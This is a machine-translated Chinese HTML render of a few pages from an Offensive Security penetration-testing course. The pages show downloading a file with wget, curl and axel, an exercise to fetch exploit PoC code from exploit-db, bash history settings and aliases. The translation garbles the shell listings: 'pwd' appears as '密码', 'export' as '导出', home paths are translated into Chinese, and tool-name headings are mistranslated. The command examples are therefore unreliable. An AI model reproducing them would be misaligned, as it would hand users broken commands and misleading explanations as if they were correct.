<div style="position:absolute;top:83257;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:83257;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">70</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">report_wget.pdf 100%[====================&gt;] 26.41M 766KB/s in 28s    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:82309;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2018-01-28 20:30:33 (964 KB/s) - 'report_wget.pdf' 已保存 [27691955/27691955]</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82329;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 67 - 通过 wget 下载文件</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:82360;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.8.2 卷曲</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82398;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">78</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一种</font><font style="vertical-align: inherit;">使用包括 IMAP/S 在内的多种协议</font><font style="vertical-align: inherit;">将数据传输</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器</font><i><font style="vertical-align: inherit;">或从</font></i><font style="vertical-align: inherit;">服务器</font><font style="vertical-align: inherit;">传输数据的工具</font><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:82417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">POP3/S、SCP、SFTP、SMB/S、SMTP/S、TELNET、TFTP 等。</font><font style="vertical-align: inherit;">渗透测试人员可以使用这个</font></font></nobr></div>
<div style="position:absolute;top:82436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载或上传文件并构建复杂的请求。</font><font style="vertical-align: inherit;">它最基本的用法和wget很相似，</font></font></nobr></div>
<div style="position:absolute;top:82456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 68 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl -o report.pdf https://www.offensive-security.com/reports/penetration</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:82508;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-testing-sample-report-2013.pdf</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82525;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">% Total % Received % Xferd Average Speed Time Time Time Current</font></font></nobr></div>
<div style="position:absolute;top:82542;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载上传总花费的剩余速度</font></font></nobr></div>
<div style="position:absolute;top:82558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">100 26.4M 100 26.4M 0 0 1590k 0 0:00:17 0:00:17 --:--:-- 870k</font></font></nobr></div>
<div style="position:absolute;top:82578;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 68 - 使用 curl 下载文件</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:82609;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.8.3 轴</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82647;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">axel </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">79</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个下载加速器，它通过多个文件从 FTP 或 HTTP 服务器传输文件。</font></font></nobr></div>
<div style="position:absolute;top:82666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接。</font><font style="vertical-align: inherit;">该工具具有大量功能，但最常见的是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，用于</font></font></nobr></div>
<div style="position:absolute;top:82686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定要使用的多个连接的数量。</font><font style="vertical-align: inherit;">在下面的例子中，我们还使用了</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:82705;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-a</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项用于更简洁的进度指示器，</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于指定不同的文件名</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载的文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/repor</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:82776;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ts/penetration-testing-sample-report-2013.pdf</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">初始化下载：https://www.offensive-security.com/reports/penetration-testing-</font></font></nobr></div>
<div style="position:absolute;top:82810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件大小：27691955 字节</font></font></nobr></div>
<div style="position:absolute;top:82827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开输出文件 report_axel.pdf</font></font></nobr></div>
<div style="position:absolute;top:82844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始下载</font></font></nobr></div>
<div style="position:absolute;top:82878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 0 完成</font></font></nobr></div>
<div style="position:absolute;top:82895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 1 完成</font></font></nobr></div>
<div style="position:absolute;top:82912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 2 完成</font></font></nobr></div>
<div style="position:absolute;top:82929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 3 完成</font></font></nobr></div>
<div style="position:absolute;top:82946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 4 完成</font></font></nobr></div>
<div style="position:absolute;top:82963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 5 完成</font></font></nobr></div>
<div style="position:absolute;top:82980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接6完成</font></font></nobr></div>
<div style="position:absolute;top:82997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接7完成</font></font></nobr></div>
<div style="position:absolute;top:83014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接8完成</font></font></nobr></div>
<div style="position:absolute;top:83031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 9 完成</font></font></nobr></div>
<div style="position:absolute;top:83048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 10 完成</font></font></nobr></div>
<div style="position:absolute;top:83065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 11 完成</font></font></nobr></div>
<div style="position:absolute;top:83082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 13 完成</font></font></nobr></div>
<div style="position:absolute;top:83099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 14 完成</font></font></nobr></div>
<div style="position:absolute;top:83116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 15 完成</font></font></nobr></div>
<div style="position:absolute;top:83133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 16 完成</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:83187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">78 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（麻省理工学院，2004 年），http://www.mit.edu/afs.new/sipb/user/ssen/src/curl-7.11.1/docs/curl.html</font></font></font></nobr></div>
<div style="position:absolute;top:83207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">79 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Ubuntu，2019），http://manpages.ubuntu.com/manpages/xenial/man1/axel.1.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:83335;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="71"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 71 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:83368;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:84445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:84445;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:84445;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">71</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:83464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接 18 完成</font></font></nobr></div>
<div style="position:absolute;top:83480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[100%] [...................................... ………………………………………………………………………………………………………………………………………………</font></font></nobr></div>
<div style="position:absolute;top:83497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">………………………………………………………………………………………………………………………………………………………………………………………… ………………………………………………………… ...................................................]</font></font></nobr></div>
<div style="position:absolute;top:83514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[ 11.1MB/秒] [00:00]</font></font></nobr></div>
<div style="position:absolute;top:83548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2 秒内下载了 26.4 兆字节。</font><font style="vertical-align: inherit;">(11380.17 KB/秒)</font></font></nobr></div>
<div style="position:absolute;top:83568;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 69 - 使用 axel 下载文件</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:83599;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.8.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:83629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 从 https://www.exploit-db.com 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载漏洞利用的 PoC 代码</font><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:83648;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">axel</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，使用不同的名称保存每个下载。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:83685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.9 自定义 Bash 环境</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:83729;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.9.1 Bash 历史自定义</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:83767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块的前面部分，我们讨论了环境变量和 history 命令。</font><font style="vertical-align: inherit;">我们可以用</font></font></nobr></div>
<div style="position:absolute;top:83786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些环境变量来改变历史命令的操作和返回数据的方式，</font></font></nobr></div>
<div style="position:absolute;top:83805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最常见的包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTCONTROL</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTIGNORE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTTIMEFORMAT</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:83838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所述</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTCONTROL</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量定义是否要删除重复的命令，命令</font></font></nobr></div>
<div style="position:absolute;top:83858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以历史中的空格开头，或两者兼而有之。</font><font style="vertical-align: inherit;">默认情况下，两者都被删除，但您可能会发现它</font></font></nobr></div>
<div style="position:absolute;top:83877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅省略重复项更有用。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:83912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">export HISTCONTROL=ignoredups</font></font></font></b></nobr></div>
<div style="position:absolute;top:83931;left:238"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 70 - 使用 HISTCONTROL 从我们的 bash 历史记录中删除重复项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:83961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所述</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTIGNORE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量是用于滤除所运行的基本命令是特别有用</font></font></nobr></div>
<div style="position:absolute;top:83980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频繁，例如 ls、exit、history、bg 等：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:84015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">export HISTIGNORE="&amp;:ls:[bf]g:exit:history"</font></font></font></b></nobr></div>
<div style="position:absolute;top:84049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir 测试</font></font></font></b></nobr></div>
<div style="position:absolute;top:84083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd 测试</font></font></font></b></nobr></div>
<div style="position:absolute;top:84117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/test$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b></nobr></div>
<div style="position:absolute;top:84150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/test$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font></font></font></b></nobr></div>
<div style="position:absolute;top:84168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/家/卡利/测试</font></font></nobr></div>
<div style="position:absolute;top:84202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/test$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b></nobr></div>
<div style="position:absolute;top:84235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/test$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">历史</font></font></font></b></nobr></div>
<div style="position:absolute;top:84252;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 export HITIGNORE="&amp;:ls:[bf]g:exit:history"</font></font></nobr></div>
<div style="position:absolute;top:84269;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 mkdir 测试</font></font></nobr></div>
<div style="position:absolute;top:84286;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 cd 测试</font></font></nobr></div>
<div style="position:absolute;top:84303;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 密码</font></font></nobr></div>
<div style="position:absolute;top:84323;left:268"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 71 - 使用 HISTIGNORE 过滤基本的常用命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTTIMEFORMAT</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">历史</font></font></b><font style="vertical-align: inherit;">输出中的日期和/或时间戳</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:84371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:84523;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="72"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 72 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:84556;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:85633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:85633;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:85633;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">72</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:84654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/test$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导出 HISTTIMEFORMAT='%F %T'</font></font></font></b></nobr></div>
<div style="position:absolute;top:84688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/test$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">历史</font></font></font></b></nobr></div>
<div style="position:absolute;top:84705;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 2018-02-12 13:37:33 export HISTIGNORE="&amp;:ls:[bf]g:exit:history"</font></font></nobr></div>
<div style="position:absolute;top:84722;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 2018-02-12 13:37:38 mkdir 测试</font></font></nobr></div>
<div style="position:absolute;top:84739;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 2018-02-12 13:37:40 cd 测试</font></font></nobr></div>
<div style="position:absolute;top:84756;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 2018-02-12 13:37:43 密码</font></font></nobr></div>
<div style="position:absolute;top:84772;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5 2018-02-12 13:37:51 导出 HISTTIMEFORMAT='%F%T'</font></font></nobr></div>
<div style="position:absolute;top:84792;left:227"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 72 - 使用 HISTTIMEFORMAT 在我们的 bash 历史记录中包含日期/时间</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本例中，我们使用了 %F（年-月-日 ISO 8601 格式）和 %T（24 小时制）。</font><font style="vertical-align: inherit;">其他</font></font></nobr></div>
<div style="position:absolute;top:84841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式可以在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strftime</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手册页中找到。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:84875;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.9.2 别名</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名是我们可以定义的替换命令名称的字符串。</font><font style="vertical-align: inherit;">别名可用于替换</font></font></nobr></div>
<div style="position:absolute;top:84932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常用命令和带有我们定义的较短命令或别名的开关。</font><font style="vertical-align: inherit;">其他</font></font></nobr></div>
<div style="position:absolute;top:84952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">换句话说，别名是我们自己定义的命令，由其他命令构建而成。</font><font style="vertical-align: inherit;">一个例子</font></font></nobr></div>
<div style="position:absolute;top:84971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中一个是 ls 命令，我们通常倾向于使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -la</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（显示结果在一个长列表中，</font></font></nobr></div>
<div style="position:absolute;top:84991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括隐藏文件）。</font><font style="vertical-align: inherit;">让我们来看看我们如何使用别名来替换这个命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">alias lsa='ls -la'</font></font></font></b></nobr></div>
<div style="position:absolute;top:85059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsa</font></font></font></b></nobr></div>
<div style="position:absolute;top:85076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总计 8308</font></font></nobr></div>
<div style="position:absolute;top:85110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">…………</font></font></nobr></div>
<div style="position:absolute;top:85127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw------- 1 kali kali 5542 Jan 22 09:56 .bash_history</font></font></nobr></div>
<div style="position:absolute;top:85144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 kali kali 3391 2017 年 4 月 25 日 .bashrc</font></font></nobr></div>
<div style="position:absolute;top:85161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwx------ 9 kali kali 4096 Oct 2 21:29 .cache</font></font></nobr></div>
<div style="position:absolute;top:85178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">…………</font></font></nobr></div>
<div style="position:absolute;top:85197;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 73 - alias 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:85227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过定义我们自己的命令</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsa</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们可以快速执行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -la</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而无需键入任何</font></font></nobr></div>
<div style="position:absolute;top:85247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根本没有争论。</font><font style="vertical-align: inherit;">我们还可以通过运行</font><font style="vertical-align: inherit;">不带参数的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">alias</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来查看已定义别名的列表</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:85279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提醒一句：alias 命令对用于别名的词没有任何限制。</font></font></nobr></div>
<div style="position:absolute;top:85298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名。</font><font style="vertical-align: inherit;">因此，可以使用已经对应于现有词的词来创建别名。</font></font></nobr></div>
<div style="position:absolute;top:85318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">我们可以在以下相当随意的示例中看到这一点：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
